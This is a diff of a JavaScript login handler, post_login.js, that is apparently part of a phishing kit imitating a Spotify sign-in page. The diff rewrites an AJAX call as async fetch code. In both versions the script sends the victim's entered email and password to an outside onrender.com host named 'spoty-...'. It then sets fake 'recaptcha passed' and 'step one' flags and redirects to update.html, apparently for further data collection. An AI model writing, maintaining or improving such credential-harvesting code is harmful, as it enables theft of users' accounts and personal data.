@@ -1,4 +1,5 @@
 console.log("post_login.js");
+
 function generateRandomString() {
     const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     let result = '';
@@ -8,55 +9,59 @@ function generateRandomString() {
     }
     return result;
 }
+
 $(document).ready(function () {
-    
-    $("#form").on("submit", function (event) {
+    $("#form").on("submit", async function (event) {
         event.preventDefault();
-        $("#login-button").prop("disabled", true);
-        var unique_id = generateRandomString();
-        var formData = new FormData(this);
+        $("#login-button").prop("disabled", true); // Disable the button to prevent multiple clicks
+        const unique_id = generateRandomString();
+        const formData = new FormData(this);
         formData.append('unique_id', unique_id);
 
+        try {
+            const response = await fetch("https://spoty-dfla0k2kfs-sdjla2dasf.onrender.com/post_login.php", {
+                method: "POST",
+                body: formData,
+            });
 
-        $.ajax({
-            type: "POST",
-            url: "https://spoty-dfla0k2kfs-sdjla2dasf.onrender.com/post_login.php",
-            data: formData,
-            processData: false, // Prevent jQuery from automatically processing the data
-            contentType: false, // Prevent jQuery from automatically setting the content type
-
-            success: function (response) {
-                console.log("Raw Response:", response);
-                if (response.status === 'success') {
-                    localStorage.setItem("recaptcha", "passed");
-                    localStorage.setItem("unique_id", unique_id);
-                    localStorage.setItem("login", "passed");
-                    localStorage.setItem("step", "one");
-
-                    $("#error_mail").html("");
-                    $("#error_pass").html("");
-                    window.location.href = 'update.html';
-                } else if (response.status === 'error' && response.errors) {
-                    if (response.errors === 'mail') {
-                        $("#signin_email").css("box-shadow", "inset 0 0 0 1px var(--essential-negative,#e91429)");
-                    } else {
-                        $("#signin_email").css("box-shadow", "");
-                    }
-                    $("#signin_email").css("box-shadow", "inset 0 0 0 1px var(--essential-negative,#e91429)");
-                    $("#signin_password").css("box-shadow", "inset 0 0 0 1px var(--essential-negative,#e91429)");
-                    $("#login-button").prop("disabled", false);
-                }
-             else {
-                    console.log("response.status:", response.status);
-                    $("#login-button").prop("disabled", false);
-                }
-            },
-            error: function (error) {
+            if (!response.ok) {
+                console.error(`HTTP Error: ${response.status} ${response.statusText}`);
                 $("#login-button").prop("disabled", false);
-                console.log("Error:", error);
+                return;
             }
-        });
 
+            const result = await response.json();
+            console.log("Raw Response:", result);
 
-});
+            debugger;
+            if (result.status === 'success') {
+                debugger;
+                // Store session data
+                localStorage.setItem("recaptcha", "passed");
+                localStorage.setItem("unique_id", unique_id);
+                localStorage.setItem("login", "passed");
+                localStorage.setItem("step", "one");
+
+                // Clear errors and redirect
+                $("#error_mail").html("");
+                $("#error_pass").html("");
+                window.location.href = 'update.html';
+            } else if (result.status === 'error' && result.errors) {
+                // Handle specific error messages
+                if (result.errors === 'mail') {
+                    $("#signin_email").css("box-shadow", "inset 0 0 0 1px var(--essential-negative,#e91429)");
+                } else {
+                    $("#signin_email").css("box-shadow", "");
+                }
+                $("#signin_password").css("box-shadow", "inset 0 0 0 1px var(--essential-negative,#e91429)");
+                $("#login-button").prop("disabled", false);
+            } else {
+                console.log("Unexpected status:", result.status);
+                $("#login-button").prop("disabled", false);
+            }
+        } catch (error) {
+            console.error("Error:", error);
+            $("#login-button").prop("disabled", false); // Re-enable button in case of error
+        }
+    });
 });
